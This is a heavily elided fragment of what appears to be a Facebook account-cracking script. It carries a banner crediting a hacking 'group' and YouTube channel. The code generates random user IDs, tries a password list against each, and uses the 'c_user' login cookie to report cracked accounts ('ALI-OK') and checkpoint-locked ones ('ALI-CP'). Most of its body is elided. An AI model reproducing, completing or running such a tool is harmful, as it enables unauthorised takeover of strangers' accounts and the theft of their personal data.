...
══════════════════════════════════════════════════
  ...
  GROUP        : Tarmim Gah Majazi

  TOOLS STATUS : Professionals Team 

  YOUTUBE     : Best Professionals
...
def random_number():
    ...
    limit = int(input('How many numbers do you want to add ? EXM: 1000,2000,100000 '))
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\033[1;32m[ALI-OK😘] '+cid+' | '+ps+'\033[0;97m')
                ...
                print('\033[1;31m[ALI-CP😢] '+cid+' | '+ps+'\033[0;97m')
